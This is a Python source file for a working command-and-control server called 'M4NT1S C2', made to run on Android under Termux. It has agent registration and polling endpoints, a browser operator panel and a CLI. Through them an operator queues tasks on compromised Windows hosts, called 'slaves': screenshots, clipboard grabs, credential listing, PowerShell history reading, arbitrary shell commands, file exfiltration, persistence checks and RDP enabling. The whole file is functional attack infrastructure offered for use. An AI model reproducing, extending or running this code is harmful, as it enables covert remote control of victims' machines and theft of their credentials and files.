#!/usr/bin/env python3
"""
M4NT1S C2 — Android / Termux, in-memory only.

Not the native development branch. Feature parity with the Windows c2.py
is deliberately not a goal: this is the checkup/relay tool for a rooted
Android host. Anything that requires an interactive session (stream,
TASK_CLEANUP, FILE_PUSH) is either absent or handled by the Windows C2.

No SQLite, no JSON, no uploads/, no screenshots/. Everything lives in
Python dicts and dies when the process exits.

Token:
  Read from C2_TOKEN env var. If unset, a fresh random token is generated
  each run and printed in the banner. Set C2_TOKEN in .bashrc if you want
  a stable token across restarts.

Self-healing:
  When an agent polls with an id this C2 has never seen (typical after a
  C2 restart, or after switching from the Windows C2), the poll reply is
  {"command": "RE-REGISTER"}. payload.ps1 handles that by calling
  /register again and updating its cached id.

Screenshots / pulled files:
  Kept in memory and served from /api/v1/image/<tid> and /api/v1/file/<tid>.
  Vanish on C2 restart — save from the browser if you want them kept.

Usage:
    python3 c2_android.py                          C2 on 127.0.0.1:5000
    python3 c2_android.py --host 0.0.0.0           also accept LAN
    python3 c2_android.py --port 8080              custom port
    python3 c2_android.py --tunnel c2.example.com  override tunnel host
    python3 c2_android.py --no-auth                DISABLE TOKEN (unsafe!)
    python3 c2_android.py 0001 status              CLI via tunnel
    python3 c2_android.py --local 0001 status      CLI via localhost
"""

import argparse
import base64
import datetime
import json
import logging
import os
import queue
import re
import secrets
import sys
import threading
import time
import urllib.error
import urllib.request

from flask import Flask, Response, jsonify, request

# ---------------------------------------------------------------------------
# CONFIG
# ---------------------------------------------------------------------------
TUNNEL_HOST = os.environ.get('M4NT1S_TUNNEL', 'c2.computerfix.services')
TUNNEL_URL  = f"https://{TUNNEL_HOST}"
LOCAL_URL   = "http://127.0.0.1:5000"

C2_TOKEN = os.environ.get('C2_TOKEN')
if not C2_TOKEN:
    C2_TOKEN = secrets.token_urlsafe(32)

SERVER_URL = TUNNEL_URL

# ---------------------------------------------------------------------------
# IN-MEMORY STATE
# ---------------------------------------------------------------------------
_lock = threading.Lock()

_slaves: dict[int, dict] = {}
_tasks:  dict[int, dict] = {}
_pending: dict[int, list[int]] = {}
_screenshots: dict[int, bytes] = {}
_files: dict[int, dict] = {}
_frames: dict[int, bytes] = {}

_next_slave_id = 0
_next_task_id  = 0

_MAX_IMAGES_TOTAL = 50 * 1024 * 1024
_MAX_FILES_TOTAL  = 100 * 1024 * 1024

def _now():
    return datetime.datetime.now(datetime.timezone.utc)

def _now_iso():
    return _now().isoformat(timespec='seconds')

def _trim_images():
    total = sum(len(v) for v in _screenshots.values())
    while total > _MAX_IMAGES_TOTAL and _screenshots:
        k = next(iter(_screenshots))
        total -= len(_screenshots.pop(k))

def _trim_files():
    total = sum(len(v['blob']) for v in _files.values())
    while total > _MAX_FILES_TOTAL and _files:
        k = next(iter(_files))
        total -= len(_files.pop(k)['blob'])

# ---------------------------------------------------------------------------
# SSE BROADCASTER
# ---------------------------------------------------------------------------
class _Sub:
    __slots__ = ('q',)
    def __init__(self):
        self.q = queue.Queue(maxsize=200)

class _Broadcaster:
    def __init__(self):
        self._subs = set()
        self._l = threading.Lock()
    def subscribe(self):
        s = _Sub()
        with self._l:
            self._subs.add(s)
        return s
    def unsubscribe(self, s):
        with self._l:
            self._subs.discard(s)
    def emit(self, event, data):
        msg = f"event: {event}\ndata: {json.dumps(data)}\n\n"
        with self._l:
            subs = list(self._subs)
        for s in subs:
            try:
                s.q.put_nowait(msg)
            except queue.Full:
                pass

broadcast = _Broadcaster()

def _log(msg, slave_id=None, task_id=None):
    broadcast.emit('log', {
        'timestamp': _now_iso(),
        'message':   msg,
        'slave_id':  slave_id,
        'task_id':   task_id,
    })

def _emit_slave(slave_id):
    with _lock:
        s = _slaves.get(slave_id)
        payload = dict(s) if s else None
    if payload:
        broadcast.emit('slave', payload)

# Throttle slave-record emissions driven by poll events. Polls arrive
# ~1 Hz per agent; emitting on every one would spam SSE. 10 s keeps the
# UI's `online` dot and `last_seen` field fresh without the noise.
_last_slave_emit: dict[int, float] = {}
_last_slave_emit_lock = threading.Lock()

def _maybe_emit_slave(slave_id, min_interval=10.0):
    now = time.time()
    with _last_slave_emit_lock:
        if now - _last_slave_emit.get(slave_id, 0.0) < min_interval:
            return
        _last_slave_emit[slave_id] = now
    _emit_slave(slave_id)

# ---------------------------------------------------------------------------
# FLASK
# ---------------------------------------------------------------------------
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------
def _client_ip() -> str:
    for h in ('CF-Connecting-IP', 'True-Client-IP',
              'X-Forwarded-For', 'X-Real-IP'):
        v = request.headers.get(h)
        if v:
            return v.split(',')[0].strip()
    return request.remote_addr or '?'

def _via_cf() -> bool:
    return 'CF-Ray' in request.headers or 'CF-Connecting-IP' in request.headers

def _slave_public(s: dict) -> dict:
    online = False
    if s.get('last_seen'):
        try:
            dt = datetime.datetime.fromisoformat(s['last_seen'].replace('Z', '+00:00'))
            online = (_now() - dt).total_seconds() < 30
        except Exception:
            pass
    return {**s, 'online': online}

def _parse_wifi(netsh_out: str) -> str:
    if not netsh_out:
        return "No output from agent."
    nets, cur = [], {}
    for raw in netsh_out.splitlines():
        line = raw.strip()
        if line.startswith("SSID ") and " : " in line:
            if cur: nets.append(cur)
            cur = {"ssid": line.split(" : ", 1)[1]}
        elif line.startswith("BSSID ") and " : " in line:
            cur["bssid"] = line.split(" : ", 1)[1]
        elif line.startswith("Signal") and " : " in line:
            cur["signal"] = line.split(" : ", 1)[1]
        elif line.startswith("Channel") and " : " in line:
            cur["channel"] = line.split(" : ", 1)[1]
    if cur: nets.append(cur)
    if not nets:
        return "No networks parsed."
    out = [f"{len(nets)} network(s) visible:"]
    for n in nets:
        out.append(f"  {n.get('ssid','?')}  sig={n.get('signal','?')}  "
                   f"ch={n.get('channel','?')}  bssid={n.get('bssid','?')}")
    return "\n".join(out)

# ---------------------------------------------------------------------------
# STATE OPERATIONS
# ---------------------------------------------------------------------------
def _register(payload, ip):
    global _next_slave_id
    hostname = payload.get('hostname', 'unknown')
    fp = payload.get('fingerprint')
    if fp is not None:
        fp = str(fp)
    with _lock:
        if fp:
            for sid, s in _slaves.items():
                if s.get('fingerprint') == fp:
                    s.update({
                        'hostname':  hostname,
                        'public_ip': ip,
                        'os':        payload.get('os', 'unknown'),
                        'kernel':    payload.get('kernel', 'unknown'),
                        'domain':    payload.get('domain', 'WORKGROUP'),
                        'is_admin':  bool(payload.get('admin', False)),
                        'last_seen': _now_iso(),
                        'status':    'active',
                    })
                    return sid, 're-reg'
        for sid, s in _slaves.items():
            if s.get('hostname') == hostname:
                s.update({
                    'fingerprint': fp,
                    'public_ip':   ip,
                    'os':          payload.get('os', 'unknown'),
                    'kernel':      payload.get('kernel', 'unknown'),
                    'domain':      payload.get('domain', 'WORKGROUP'),
                    'is_admin':    bool(payload.get('admin', False)),
                    'last_seen':   _now_iso(),
                    'status':      'active',
                })
                return sid, 're-reg'
        _next_slave_id += 1
        sid = _next_slave_id
        _slaves[sid] = {
            'numeric_id':  sid,
            'fingerprint': fp,
            'hostname':    hostname,
            'public_ip':   ip,
            'os':          payload.get('os', 'unknown'),
            'kernel':      payload.get('kernel', 'unknown'),
            'domain':      payload.get('domain', 'WORKGROUP'),
            'is_admin':    bool(payload.get('admin', False)),
            'last_seen':   _now_iso(),
            'status':      'active',
            'last_cmd':    '',
            'notes':       '',
            'tunnel_kind': None,
            'tunnel_port': None,
        }
        return sid, 'new'

def _queue_task(slave_id, command, payload):
    global _next_task_id
    with _lock:
        if slave_id not in _slaves:
            return None
        _next_task_id += 1
        tid = _next_task_id
        _tasks[tid] = {
            'id':           tid,
            'slave_id':     slave_id,
            'command':      command,
            'payload':      payload,
            'status':       'pending',
            'created_at':   _now_iso(),
            'assigned_at':  None,
            'completed_at': None,
            'result':       None,
        }
        _pending.setdefault(slave_id, []).append(tid)
        _slaves[slave_id]['last_cmd'] = command
        return tid

def _poll_next(slave_id):
    """Returns ('unknown', None), ('nop', None), or ('task', task_dict)."""
    with _lock:
        if slave_id not in _slaves:
            return 'unknown', None
        _slaves[slave_id]['last_seen'] = _now_iso()
        _slaves[slave_id]['status'] = 'active'
        pend = _pending.get(slave_id, [])
        if not pend:
            return 'nop', None
        tid = pend.pop(0)
        task = _tasks.get(tid)
        if not task:
            return 'nop', None
        task['status'] = 'in_progress'
        task['assigned_at'] = _now_iso()
        return 'task', dict(task)

# ---------------------------------------------------------------------------
# AUTH
# ---------------------------------------------------------------------------
AGENT_ENDPOINTS = {
    '/api/v1/register',
    '/api/v1/poll',
    '/api/v1/result',
}

@app.before_request
def check_auth():
    if C2_TOKEN is None:
        return
    if request.path == '/':
        return
    if request.path in AGENT_ENDPOINTS:
        return
    provided = request.headers.get('X-C2-Token') or request.args.get('token', '')
    if provided != C2_TOKEN:
        return jsonify({'error': 'unauthorized',
                        'hint': 'append ?token=... to the URL'}), 401

# ---------------------------------------------------------------------------
# AGENT ENDPOINTS
# ---------------------------------------------------------------------------
@app.route('/api/v1/register', methods=['POST'])
def register():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400

    sid, how = _register(data, _client_ip())
    _log(f"[{how.upper()}] ID {sid:04d} ({data.get('hostname','?')}) "
         f"from {_client_ip()} "
         f"{'via CF' if _via_cf() else 'direct'}",
         slave_id=sid)
    _emit_slave(sid)
    return jsonify({'numeric_id': sid, 'status': 'ok'})

@app.route('/api/v1/poll', methods=['POST'])
def poll():
    data = request.get_json(silent=True)
    if not data or 'id' not in data:
        return jsonify({'error': 'Missing id'}), 400

    sid = data['id']
    kind, task = _poll_next(sid)

    if kind == 'unknown':
        _log(f"[!] unknown poll id {sid} — RE-REGISTER sent")
        return jsonify({'command': 'RE-REGISTER'})

    _maybe_emit_slave(sid)

    if kind == 'nop':
        return jsonify({'command': 'NOP'})
    return jsonify({
        'command': task['command'],
        'task_id': task['id'],
        'payload': task['payload'],
    })

@app.route('/api/v1/result', methods=['POST'])
def result():
    data = request.get_json(silent=True)
    if not data or 'task_id' not in data:
        return jsonify({'error': 'Missing task_id'}), 400

    tid    = data['task_id']
    status = data.get('status', 'completed')
    output = data.get('output', '') or ''

    with _lock:
        task = _tasks.get(tid)
        if task:
            task['status'] = status
            task['completed_at'] = _now_iso()
            task['result'] = output
            sid = task['slave_id']
            cmd = task['command']
        else:
            sid = None
            cmd = '?'

    if sid is None:
        return jsonify({'status': 'ok'})

    if output.startswith('IMAGE:'):
        try:
            img = base64.b64decode(output[6:])
            with _lock:
                _screenshots[tid] = img
                _trim_images()
            broadcast.emit('image', {'task_id': tid, 'slave_id': sid,
                                     'size': len(img)})
            _log(f"[SCREENSHOT] {len(img)} bytes", slave_id=sid, task_id=tid)
        except Exception as e:
            _log(f"[!] image decode: {e}", slave_id=sid)
        return jsonify({'status': 'ok'})

    if output.startswith('FILE:'):
        try:
            rest = output[5:]
            name, b64 = rest.split(':', 1)
            name = re.sub(r'[^A-Za-z0-9._-]', '_',
                          os.path.basename(name)) or 'file.bin'
            blob = base64.b64decode(b64)
            with _lock:
                _files[tid] = {'name': name, 'blob': blob}
                _trim_files()
            broadcast.emit('file', {'task_id': tid, 'slave_id': sid,
                                    'filename': name, 'size': len(blob)})
            _log(f"[FILE] {name} ({len(blob)} bytes)", slave_id=sid, task_id=tid)
        except Exception as e:
            _log(f"[!] file decode: {e}", slave_id=sid)
        return jsonify({'status': 'ok'})

    if cmd == 'STATUS':
        with _lock:
            s = _slaves.get(sid)
            if s:
                for line in output.splitlines():
                    if line.startswith('Admin:'):
                        s['is_admin'] = 'True' in line
                    elif line.startswith('User:'):
                        user = line.split(':', 1)[1].strip()
                        dom = user.split('\\', 1)[0] if '\\' in user else 'WORKGROUP'
                        s['domain'] = dom

    if cmd == 'SYSINFO':
        with _lock:
            s = _slaves.get(sid)
            if s:
                for line in output.splitlines():
                    if line.startswith('Domain:'):
                        s['domain'] = line.split(':', 1)[1].strip()

    if cmd == 'TRIANGULATE':
        _log(_parse_wifi(output), slave_id=sid, task_id=tid)
    elif output:
        _log(f"[{cmd}]\n{output}", slave_id=sid, task_id=tid)
    else:
        _log(f"[{cmd}] finished", slave_id=sid, task_id=tid)

    _emit_slave(sid)
    return jsonify({'status': 'ok'})

@app.route('/api/v1/stream', methods=['POST'])
def stream():
    data = request.get_json(silent=True)
    if not data or 'frame' not in data or 'id' not in data:
        return jsonify({'error': 'missing fields'}), 400
    try:
        img = base64.b64decode(data['frame'])
    except Exception as e:
        return jsonify({'error': str(e)}), 400
    sid = int(data['id'])
    with _lock:
        _frames[sid] = img
    broadcast.emit('frame', {'slave_id': sid, 'size': len(img),
                             'ts': int(time.time() * 1000)})
    return jsonify({'status': 'ok'})

# ---------------------------------------------------------------------------
# CONTROL ENDPOINTS
# ---------------------------------------------------------------------------
@app.route('/api/v1/health')
def health():
    with _lock:
        n = len(_slaves)
    return jsonify({
        'status':      'ok',
        'slaves':      n,
        'auth':        'on' if C2_TOKEN else 'off',
        'tunnel_host': TUNNEL_HOST,
        'tunnel_url':  TUNNEL_URL,
        'via':         'cloudflare' if _via_cf() else 'direct',
        'client_ip':   _client_ip(),
        'storage':     'in-memory',
        'time':        _now_iso(),
    })

@app.route('/api/v1/slaves')
def list_slaves():
    with _lock:
        rows = [_slave_public(dict(s)) for s in _slaves.values()]
    return jsonify({'slaves': rows})

@app.route('/api/v1/slaves/<int:sid>')
def slave_detail(sid):
    with _lock:
        s = _slaves.get(sid)
        if not s:
            return jsonify({'error': 'not found'}), 404
        return jsonify(_slave_public(dict(s)))

@app.route('/api/v1/command', methods=['POST'])
def post_command():
    data = request.get_json(silent=True)
    if not data or 'slave_id' not in data or 'command' not in data:
        return jsonify({'error': 'need slave_id + command'}), 400
    sid     = int(data['slave_id'])
    command = data['command']
    payload = data.get('payload')
    tid = _queue_task(sid, command, payload)
    if tid is None:
        return jsonify({'error': 'slave not found'}), 404
    _log(f"[QUEUE] <- {command} (task {tid})", slave_id=sid, task_id=tid)
    _emit_slave(sid)
    return jsonify({'task_id': tid, 'status': 'queued'})

@app.route('/api/v1/tasks/<int:tid>')
def get_task(tid):
    with _lock:
        t = _tasks.get(tid)
        if not t:
            return jsonify({'error': 'not found'}), 404
        return jsonify(dict(t))

@app.route('/api/v1/image/<int:tid>')
def get_image(tid):
    with _lock:
        img = _screenshots.get(tid)
    if not img:
        return jsonify({'error': 'not found (or C2 restarted)'}), 404
    return Response(img, mimetype='image/jpeg',
                    headers={'Cache-Control': 'no-store'})

@app.route('/api/v1/frame/<int:sid>')
def get_frame(sid):
    with _lock:
        f = _frames.get(sid)
    if not f:
        return jsonify({'error': 'no frame'}), 404
    return Response(f, mimetype='image/jpeg',
                    headers={'Cache-Control': 'no-store, no-transform',
                             'CDN-Cache-Control': 'no-store'})

@app.route('/api/v1/file/<int:tid>')
def get_file(tid):
    with _lock:
        f = _files.get(tid)
        if not f:
            return jsonify({'error': 'not found (or C2 restarted)'}), 404
        name = f['name']
        blob = f['blob']
    return Response(blob, mimetype='application/octet-stream',
                    headers={
                        'Content-Disposition': f'attachment; filename="{name}"',
                        'Cache-Control': 'no-store',
                    })

@app.route('/api/v1/events')
def events():
    def gen(sub):
        try:
            with _lock:
                initial = [_slave_public(dict(s)) for s in _slaves.values()]
            yield f"event: init\ndata: {json.dumps({'slaves': initial})}\n\n"
            last = time.time()
            while True:
                try:
                    msg = sub.q.get(timeout=5)
                    yield msg
                    last = time.time()
                except queue.Empty:
                    if time.time() - last > 20:
                        yield ": keepalive\n\n"
                        last = time.time()
        except GeneratorExit:
            pass
        finally:
            broadcast.unsubscribe(sub)
    sub = broadcast.subscribe()
    return Response(gen(sub), mimetype='text/event-stream',
                    headers={
                        'Cache-Control': 'no-cache, no-transform',
                        'X-Accel-Buffering': 'no',
                        'Connection': 'keep-alive',
                        'CDN-Cache-Control': 'no-store',
                    })

# ---------------------------------------------------------------------------
# WEB UI
# ---------------------------------------------------------------------------
WEB_UI = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>M4NT1S C2</title>
<style>
:root { --bg:#0a0a0a; --panel:#111; --border:#1f1f1f; --fg:#c7c7c7;
        --dim:#666; --accent:#00ff88; --accent2:#00aa55; --warn:#ff5555; }
* { box-sizing:border-box; }
body { margin:0; background:var(--bg); color:var(--fg);
       font-family:'Consolas','Menlo','DejaVu Sans Mono',monospace;
       font-size:13px; line-height:1.4; }
header { background:var(--panel); padding:8px 12px; border-bottom:1px solid var(--border);
         display:flex; justify-content:space-between; align-items:center;
         gap:8px; flex-wrap:wrap; }
header h1 { font-size:14px; margin:0; color:var(--accent); letter-spacing:2px; }
header .tunnel { font-size:10px; color:var(--dim); }
header .status { font-size:11px; color:var(--dim); }
header .status.ok  { color:var(--accent); }
header .status.err { color:var(--warn); }
.layout { display:flex; flex-direction:column; height:calc(100vh - 40px); }
.slaves { background:var(--panel); border-bottom:1px solid var(--border);
          max-height:35vh; overflow-y:auto; padding:6px; }
.slaves h2, .main h2 { font-size:11px; color:var(--dim); margin:4px 6px 6px;
                       text-transform:uppercase; letter-spacing:1px; }
.slaves ul { list-style:none; margin:0; padding:0; }
.slave { padding:6px 8px; margin:2px 0; border-radius:3px; cursor:pointer;
         border-left:3px solid transparent; font-size:12px; }
.slave:hover { background:#181818; }
.slave.selected { background:#0f2418; border-left-color:var(--accent); }
.slave .sid { color:var(--accent); font-weight:bold; }
.slave .host { color:var(--fg); margin-left:6px; }
.slave .tag { color:var(--dim); margin-left:4px; font-size:10px; }
.slave.offline .sid, .slave.offline .host { color:var(--dim); }
.main { flex:1; display:flex; flex-direction:column; overflow:hidden; padding:8px; gap:8px; }
.panel { background:var(--panel); border:1px solid var(--border); border-radius:3px; }
#detail { padding:8px 10px; font-size:12px; max-height:20vh; overflow-y:auto; }
#detail .row { display:flex; gap:8px; padding:1px 0; }
#detail .k { color:var(--dim); min-width:100px; }
#detail .v { color:var(--fg); word-break:break-all; }
.cmd-row { display:flex; gap:6px; padding:8px; flex-wrap:wrap; }
.cmd-row select, .cmd-row input, .cmd-row button {
    background:#0a0a0a; color:var(--fg); border:1px solid var(--border);
    padding:6px 8px; border-radius:3px; font-family:inherit; font-size:12px; }
.cmd-row select { flex:0 0 160px; }
.cmd-row input  { flex:1; min-width:120px; }
.cmd-row button { background:#0f2418; color:var(--accent); cursor:pointer;
                  border-color:var(--accent2); }
.cmd-row button:hover { background:#1a3d28; }
.viewer { display:none; background:#000; text-align:center; padding:0;
          max-height:35vh; overflow:hidden; }
.viewer img { max-width:100%; max-height:35vh; display:block; margin:0 auto;
              image-rendering:pixelated; }
.viewer.on { display:block; }
#log { flex:1; overflow-y:auto; padding:8px; font-size:11px;
       white-space:pre-wrap; word-break:break-word; min-height:100px; }
#log .line { padding:1px 0; border-bottom:1px solid #0f0f0f; }
#log .ts { color:var(--dim); margin-right:6px; }
#log .msg.warn { color:var(--warn); }
#log .msg.ok { color:var(--accent); }
#log .link { color:#4aa3ff; text-decoration:underline; cursor:pointer; }
@media (min-width:800px) {
    .layout { flex-direction:row; }
    .slaves { width:280px; max-height:none; border-bottom:none;
              border-right:1px solid var(--border); }
    .main { padding:12px; }
}
</style>
</head>
<body>
<header>
  <div>
    <h1>M4NT1S C2</h1>
    <div class="tunnel" id="tunnel-info">via cloudflare tunnel</div>
  </div>
  <span id="conn-status" class="status">connecting...</span>
</header>

<div class="layout">
  <aside class="slaves">
    <h2>Slaves</h2>
    <ul id="slave-list"></ul>
  </aside>

  <main class="main">
    <section id="detail" class="panel">
      <h2>Select a slave</h2>
      <div id="detail-body"></div>
    </section>

    <section class="panel">
      <div class="cmd-row">
        <select id="cmd-select">
          <optgroup label="One-shot">
            <option value="STATUS">Status</option>
            <option value="SYSINFO">Sysinfo</option>
            <option value="SCREEN_CAPTURE">Screenshot</option>
            <option value="CLIPBOARD_GET">Clipboard</option>
            <option value="TRIANGULATE">Wi-Fi scan</option>
          </optgroup>
          <optgroup label="Recon">
            <option value="PROCESSES">Processes</option>
            <option value="NETWORK_INFO">Network info</option>
            <option value="DNS_CACHE">DNS cache</option>
            <option value="DEFENDER_CHECK">Defender</option>
            <option value="PERSIST_LIST">Persistence</option>
          </optgroup>
          <optgroup label="Collect">
            <option value="CRED_LIST">Credentials</option>
            <option value="HISTORY_READ">PS history</option>
          </optgroup>
          <optgroup label="Shell">
            <option value="SHELL">Shell command</option>
            <option value="FILE_PULL">File pull (path)</option>
          </optgroup>
          <optgroup label="Danger">
            <option value="KILLSWITCH">Killswitch</option>
          </optgroup>
        </select>
        <input id="cmd-input" placeholder="optional: command / path / interval_ms">
        <button id="send-btn">Send</button>
      </div>
    </section>

    <section id="viewer" class="panel viewer">
      <img id="viewer-img" alt="">
    </section>

    <section id="log" class="panel"></section>
  </main>
</div>

<script>
const params = new URLSearchParams(location.search);
const TOKEN = params.get('token') || '';
const tok = TOKEN ? `?token=${encodeURIComponent(TOKEN)}` : '';

let selectedSlave = null;
let slaves = {};
let es = null;

const $ = (id) => document.getElementById(id);
const connStatus = $('conn-status');
const tunnelInfo = $('tunnel-info');
const slaveList  = $('slave-list');
const detailBody = $('detail-body');
const cmdSelect  = $('cmd-select');
const cmdInput   = $('cmd-input');
const sendBtn    = $('send-btn');
const viewer     = $('viewer');
const viewerImg  = $('viewer-img');
const logEl      = $('log');

function setStatus(text, kind) {
  connStatus.textContent = text;
  connStatus.className = 'status ' + (kind || '');
}

function addLog(line, cls) {
  const el = document.createElement('div');
  el.className = 'line';
  const ts = document.createElement('span');
  ts.className = 'ts';
  ts.textContent = new Date().toLocaleTimeString();
  const msg = document.createElement('span');
  msg.className = 'msg ' + (cls || '');
  msg.textContent = line;
  el.appendChild(ts);
  el.appendChild(msg);
  logEl.appendChild(el);
  while (logEl.children.length > 200) logEl.removeChild(logEl.firstChild);
  logEl.scrollTop = logEl.scrollHeight;
}

function renderSlaveList() {
  slaveList.innerHTML = '';
  const sorted = Object.values(slaves).sort((a, b) => a.numeric_id - b.numeric_id);
  if (!sorted.length) {
    const li = document.createElement('li');
    li.className = 'slave';
    li.innerHTML = '<span class="host" style="color:var(--dim)">no slaves yet</span>';
    slaveList.appendChild(li);
    return;
  }
  for (const s of sorted) {
    const li = document.createElement('li');
    li.className = 'slave' + (s.online ? '' : ' offline')
                 + (selectedSlave === s.numeric_id ? ' selected' : '');
    const sid = document.createElement('span'); sid.className = 'sid';
    sid.textContent = String(s.numeric_id).padStart(4, '0');
    const host = document.createElement('span'); host.className = 'host';
    host.textContent = s.hostname || 'unknown';
    li.appendChild(sid); li.appendChild(host);
    if (s.is_admin) {
      const t = document.createElement('span'); t.className = 'tag';
      t.textContent = '[ADMIN]'; li.appendChild(t);
    }
    li.addEventListener('click', () => selectSlave(s.numeric_id));
    slaveList.appendChild(li);
  }
}

function renderDetail(s) {
  detailBody.innerHTML = '';
  const rows = [
    ['ID',         String(s.numeric_id).padStart(4, '0')],
    ['Hostname',   s.hostname || '-'],
    ['Public IP',  s.public_ip || '-'],
    ['OS',         s.os || '-'],
    ['Domain',     s.domain || '-'],
    ['Admin',      s.is_admin ? 'yes' : 'no'],
    ['Last CMD',   s.last_cmd || '-'],
    ['Last Seen',  s.last_seen || '-'],
    ['Status',     s.online ? 'online' : 'offline'],
  ];
  for (const [k, v] of rows) {
    const row = document.createElement('div'); row.className = 'row';
    const kEl = document.createElement('span'); kEl.className = 'k'; kEl.textContent = k;
    const vEl = document.createElement('span'); vEl.className = 'v'; vEl.textContent = v;
    row.appendChild(kEl); row.appendChild(vEl);
    detailBody.appendChild(row);
  }
}

function selectSlave(sid) {
  selectedSlave = sid;
  const s = slaves[sid];
  if (!s) return;
  renderSlaveList();
  renderDetail(s);
  fetch(`/api/v1/frame/${sid}${tok}`).then(r => {
    if (r.ok) r.blob().then(b => {
      viewerImg.src = URL.createObjectURL(b);
      viewer.classList.add('on');
    });
  }).catch(() => {});
}

function cmdPayload() {
  const cmd = cmdSelect.value;
  const val = cmdInput.value.trim();
  const sid = selectedSlave;
  if (!sid) { addLog('no slave selected', 'warn'); return null; }
  let payload = null;
  if (cmd === 'SHELL') {
    if (!val) { addLog('SHELL needs a command', 'warn'); return null; }
    payload = { cmd: val };
  } else if (cmd === 'FILE_PULL') {
    if (!val) { addLog('FILE_PULL needs a path', 'warn'); return null; }
    payload = { path: val };
  }
  return { slave_id: sid, command: cmd, payload };
}

async function sendCommand() {
  const body = cmdPayload();
  if (!body) return;
  try {
    const r = await fetch(`/api/v1/command${tok}`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    const j = await r.json();
    if (r.ok) addLog(`queued ${body.command} (task ${j.task_id})`, 'ok');
    else addLog(`error: ${j.error || r.status}`, 'warn');
  } catch (e) {
    addLog(`network error: ${e.message}`, 'warn');
  }
}

async function loadImage(tid) {
  try {
    const r = await fetch(`/api/v1/image/${tid}${tok}`);
    if (!r.ok) return;
    const blob = await r.blob();
    viewerImg.src = URL.createObjectURL(blob);
    viewer.classList.add('on');
  } catch (e) {}
}

async function loadHealth() {
  try {
    const r = await fetch(`/api/v1/health${tok}`);
    if (r.status === 401) {
      setStatus('unauthorized — add ?token=', 'err');
      return;
    }
    if (!r.ok) return;
    const h = await r.json();
    tunnelInfo.textContent = `via ${h.via} · ${h.tunnel_host} · ${h.storage}`;
  } catch (e) {}
}

function connectSSE() {
  if (es) es.close();
  es = new EventSource(`/api/v1/events${tok}`);
  es.addEventListener('open', () => {
    setStatus('live', 'ok');
    addLog('connected — waiting for slaves', 'ok');
  });
  es.addEventListener('error', () => setStatus('reconnecting...', 'err'));
  es.addEventListener('init', (e) => {
    const d = JSON.parse(e.data);
    slaves = {};
    for (const s of d.slaves) slaves[s.numeric_id] = s;
    renderSlaveList();
  });
  es.addEventListener('slave', (e) => {
    const s = JSON.parse(e.data);
    slaves[s.numeric_id] = s;
    renderSlaveList();
    if (selectedSlave === s.numeric_id) renderDetail(s);
  });
  es.addEventListener('log', (e) => {
    const d = JSON.parse(e.data);
    const prefix = d.slave_id ? `[${String(d.slave_id).padStart(4, '0')}] ` : '';
    const warn = d.message.startsWith('[') && d.message.includes('!');
    addLog(prefix + d.message, warn ? 'warn' : '');
  });
  es.addEventListener('image', (e) => {
    const d = JSON.parse(e.data);
    if (selectedSlave === d.slave_id) loadImage(d.task_id);
    addLog(`screenshot ready (task ${d.task_id})`, 'ok');
  });
  es.addEventListener('file', (e) => {
    const d = JSON.parse(e.data);
    const link = document.createElement('a');
    link.href = `/api/v1/file/${d.task_id}${tok}`;
    link.textContent = `[download ${d.filename} (${d.size} B)]`;
    link.className = 'link';
    link.target = '_blank';
    const wrap = document.createElement('div'); wrap.className = 'line';
    wrap.appendChild(link); logEl.appendChild(wrap);
    logEl.scrollTop = logEl.scrollHeight;
  });
  es.addEventListener('frame', (e) => {
    const d = JSON.parse(e.data);
    if (selectedSlave === d.slave_id) {
      const img = new Image();
      img.onload = () => { viewerImg.src = img.src; viewer.classList.add('on'); };
      img.src = `/api/v1/frame/${d.slave_id}?t=${d.ts}${tok ? '&' + tok.slice(1) : ''}`;
    }
  });
}

sendBtn.addEventListener('click', sendCommand);
cmdInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendCommand();
});

setStatus('connecting...');
loadHealth();
connectSSE();
</script>
</body>
</html>
"""

@app.route('/')
def web_ui():
    return Response(WEB_UI, mimetype='text/html')

# ---------------------------------------------------------------------------
# CLI MODE
# ---------------------------------------------------------------------------
CLI_ALLOWED = {
    "STATUS", "SYSINFO", "SHELL", "SCREEN_CAPTURE", "TRIANGULATE",
    "CLIPBOARD_GET", "PROCESSES", "NETWORK_INFO", "DNS_CACHE",
    "DEFENDER_CHECK", "PERSIST_LIST", "KILLSWITCH",
    "FILE_PULL", "CRED_LIST", "HISTORY_READ",
    "RDP_ENABLE", "RDP_DISABLE",
}

def _http(method, path, data=None, timeout=30):
    url = f"{SERVER_URL}{path}"
    headers = {'Content-Type': 'application/json'}
    if C2_TOKEN:
        headers['X-C2-Token'] = C2_TOKEN
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try: body = e.read().decode()[:300]
        except Exception: body = ''
        return {'error': f'HTTP {e.code}: {body}'}
    except Exception as e:
        return {'error': str(e)}

def cli_main(args):
    if len(args) < 2:
        print("Usage: python3 c2_android.py [--local] <id> <command> [args...]")
        sys.exit(1)
    if not args[0].isdigit():
        print("ID must be numeric."); sys.exit(1)
    sid = int(args[0])
    command = args[1].upper()

    if command not in CLI_ALLOWED:
        print(f"  '{command}' not supported from CLI.")
        print(f"  allowed: {', '.join(sorted(CLI_ALLOWED))}")
        sys.exit(1)

    payload = None
    if command == 'SHELL' and len(args) > 2:
        payload = {'cmd': ' '.join(args[2:])}
    elif command == 'FILE_PULL' and len(args) > 2:
        payload = {'path': ' '.join(args[2:])}

    print(f"  target: {SERVER_URL}")
    r = _http('POST', '/api/v1/command',
              {'slave_id': sid, 'command': command, 'payload': payload})
    if 'error' in r:
        print(f"  error: {r['error']}"); sys.exit(1)
    tid = r['task_id']
    print(f"  queued {command} (task {tid}) — waiting...")
    deadline = time.time() + 60
    while time.time() < deadline:
        t = _http('GET', f'/api/v1/tasks/{tid}')
        if 'error' in t:
            print(f"  {t['error']}"); break
        if t.get('status') == 'completed':
            print(t.get('result') or '(empty)'); return
        time.sleep(0.5)
    print("  timeout")

